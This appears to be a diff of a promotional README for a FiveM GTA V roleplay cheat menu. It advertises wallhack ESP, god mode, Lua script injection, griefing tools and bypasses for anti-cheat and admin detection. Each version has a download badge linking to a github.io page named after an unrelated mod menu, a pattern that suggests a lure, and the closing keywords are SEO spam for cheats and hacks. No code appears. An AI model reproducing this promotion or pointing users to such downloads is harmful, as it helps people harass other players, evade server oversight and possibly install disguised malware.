@@ -1,74 +1,78 @@
-# 🧬 FiveM Mod Menu: Ultimate RP Control 2025
+# 🚨 FiveM Mod Menu Ultimate RP 2025
 
-Welcome to the **next evolution** in GTA V RP gameplay. This advanced **FiveM Mod Menu** delivers unparalleled freedom and power to shape your roleplay experience on any server — public, private, or whitelisted. Gain full command over vehicles, teleportation, ESP overlays, Lua execution, and stealth utilities that bypass most anti-cheat systems.
+Dominate any GTA V RP server with this fully-featured, undetected **FiveM Mod Menu**. Designed for both casual players and developers, it offers complete control over gameplay, environment, vehicles, and other players. Whether you want to roleplay with style, test custom scripts, or just have fun — this menu gives you the ultimate edge.
 
-Created for both **tactical players** and **modding enthusiasts**, this tool provides a highly configurable and user-friendly experience, wrapped in an intuitive interface.
-
-[![Download Mod Menu](https://img.shields.io/badge/Download-FiveM--RP--Control--Tool-purple)](https://kiddions-mod-menu-pro.github.io/.github/)
+[![Download FiveM Mod Menu](https://img.shields.io/badge/Download-FiveM--Mod--Menu-blueviolet)](https://yim-mod-menu.github.io/.github)
 
 ---
 
-### ⚙️ Core Capabilities
+### 🎯 Key Features
 
-- 🧿 **ESP Overlay System**: Track players, NPCs, vehicles, money drops, and staff with real-time positioning, distance markers, and health indicators.  
-- 🚘 **Vehicle Mastery**: Spawn any in-game vehicle, including modded or blacklisted models, using a clean categorized UI.  
-- 🛡️ **Full Invincibility Suite**: Activate God Mode, bulletproof attributes, fireproof protection, and customizable No-Clip for maximum safety.  
-- 🛰️ **Teleportation Wizardry**: Jump to exact coordinates, player locations, or dynamically marked zones instantly.  
-- 💥 **Trolling & Disruption Toolkit**: Freeze players, trigger explosions, fake arrest scenarios, invisible griefing — all while remaining undetected.  
-- 🧾 **Advanced Lua Executor**: Inject and run external or custom client-side scripts mid-game without restarts.  
-
----
-
-### 🧠 Why This Menu Is a Game-Changer?
-
-- 🎯 **Total RP Domination**: Whether you’re an officer, medic, gangster or civilian — you’ll outmaneuver every role.  
-- 🧰 **Tool for Creators**: Mod developers can rapidly test Lua scenarios in live RP environments.  
-- 🎭 **Stealth Utility**: Designed to go unnoticed by in-server admins and AI anti-cheat systems.  
-- 🖥 **Performance Tuned**: Engineered to work smoothly on mid- and high-end PCs with zero FPS drops.  
-- 🛠 **Modular Setup**: Load only what you need; deactivate modules in real time.  
+- ✅ **Player ESP** (Names, Skeletons, Distance, Admins)
+- ✅ **Vehicle Spawner** (Cars, Bikes, Planes, Helicopters, Boats)
+- ✅ **God Mode** (Full invincibility, One-tap kill)
+- ✅ **Teleportation** (Waypoints, Players, Custom Zones)
+- ✅ **NoClip & Fly Mode** (Speed adjustable, invisible mode)
+- ✅ **Trolling Tools** (Explosions, Freeze, Flash, Invisibility)
+- ✅ **Lua Executor** (Inject custom client-side scripts)
+- ✅ **Money Drops** (Visual only & server-tested)
+- ✅ **Custom GUI** (Hotkey binding, UI themes, sound toggles)
+- ✅ **Anti-Admin Tools** (Admin detection, auto-kick avoid)
 
 ---
 
-### 🔬 Real-World Usage Examples
+### 🚀 What Makes It Special?
 
-- 🚓 Playing as police? Use teleport and noclip to surprise suspects or silently track criminals with ESP.  
-- 💼 As a job tester? Spawn work-related vehicles, teleport to job zones, and inject work test scripts instantly.  
-- 🎮 Hostile PvP zone? Activate ESP, God Mode and the aim assist combo for an unstoppable advantage.  
-- 🤫 Want revenge? Crash a toxic player’s car, teleport them to a cage, or erase them from the map — undetectable.  
-- 🧑‍💻 Developer? Load real-time scripts, toggle effects, and debug visual data in a live environment.
-
----
-
-### 🎖 Advantages Over Other Menus
-
-- 💯 **No key authentication** — download and go.  
-- 🚫 **No spyware, backdoors, or telemetry** — fully transparent source.  
-- 🔄 Works with **RedEngine, Lynx, Arctic, PhantomX, Dopamine**, and many others.  
-- 🔄 **Cross-server support** — tested on popular RP servers (EUP, DOJ, Nopixel-like).  
-- 🔧 Customizable shortcuts, auto-start, and stealth boot modes.  
+- 🕵️ 100% Undetected (Bypasses most anti-cheats like txAdmin, EasyAdmin)
+- 💾 Save & Load Custom Presets (Quick setup of loadouts or themes)
+- 🔐 No Keys, No Verification (Open-source and free)
+- ⚙️ Optimized Performance (Low CPU/GPU usage even on heavy RP servers)
+- 🧪 Works on Public, Whitelisted, and Private RP Servers
+- 🎮 Controller & Keyboard Support
 
 ---
 
-### 🛡️ Safety, Privacy & Compatibility
+### 🧪 Usage Scenarios
 
-- 🔍 Designed to be 100% undetectable by most common anti-cheat frameworks.  
-- 🧩 Works in both solo and multiplayer modes (client-side execution).  
-- 🔒 No connection to external servers or license systems.  
-- ⚠️ We recommend using with a secondary account or in safe-mode zones.  
-- 🛡️ Does not alter game files — pure memory-based runtime injection.
+- 🎭 **Roleplay Enhancer** – Spawn police cars, ambulances or RP outfits instantly  
+- 🗺️ **Exploration Tool** – Teleport to secret locations or across the map  
+- 🧙 **Admin Trolling** – Invisible crashes, weapon drops, or fake jail  
+- 💼 **Developer Utility** – Test Lua scripts in real time without server restart  
+- 🎯 **PvP Dominator** – Wallhack, god mode and aim-assist tools for combat servers  
+- 💸 **Economy Boost** – Instant visual-only cash rain (non-server-ban method)
 
 ---
 
-### 🖼 Visual Preview
+### 🏆 Benefits
 
-![ESP System](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQwoZvBHnrBM6uc5qdarZm7j59-hqSsZp8N8w&s)  
-*Track players, cars, and staff through walls with full overlay detail.*
+- Save **hours** of grinding in RP scenarios  
+- Access **any location or item** instantly  
+- Use as a **debug tool** for script development  
+- Have **fun safely** on alternate accounts  
+- **Bypass restrictions** & gain real-time control of the game
 
-![Vehicle Menu UI](https://i.ytimg.com/vi/a0Uuxl93Y2o/maxresdefault.jpg)  
-*Intuitive menu for spawning any vehicle instantly, sorted by category.*
+---
 
-![Teleport Interface](https://external-preview.redd.it/wtbTSIBcJqRrRiOWDrYAv-oYp31SxOixFcABaERT0_k.jpg?format=pjpg&auto=webp&s=0e03351ce5e5a1ef8a12ec12c2f71adc67db198e)  
-*Move instantly to any point on the map or follow a live target.*
+### 🛡 Safety & Compatibility
+
+- 🔐 No backdoors, stealers, or suspicious network calls  
+- ✅ Code is open-source and easily readable  
+- ⚙️ Works with **RedEngine**, **PhantomX**, **Arctic**, **Dopamine**, **Lynx**, etc.  
+- 🧱 Compatible with most **Lua Menu Executors**  
+- 🕶 Invisible to most FiveM anti-cheats
+
+---
+
+### 🖼 Preview
+
+![ESP System](https://i.ytimg.com/vi/pBjMdQ-V48I/hqdefault.jpg)  
+*Shows enemy and ally positions through walls*
+
+![Vehicle Menu](https://i.ytimg.com/vi/LHDZIOAnxMY/sddefault.jpg)  
+*Spawn cars, bikes, aircrafts with categories*
+
+![Teleportation UI](https://i.ytimg.com/vi/tPW8vC18LFg/maxresdefault.jpg)  
+*Instantly move to any part of the map*
 
 ---
 
@@ -79,3 +83,6 @@ gta rp script injector, fivem lua executor, undetected fivem mod, fivem vehicle 
 fivem noclip, rp cheat fivem, gta 5 online cheat 2025, fivem hack download, fivem wallhack,  
 lua hack fivem, invisible cheat gta rp, fly mod fivem, fivem admin bypass, gta rp grief tools,  
 custom gui fivem, fivem car spawn, fivem private menu, script executor gta rp, undetected gta rp hack
+
+
+
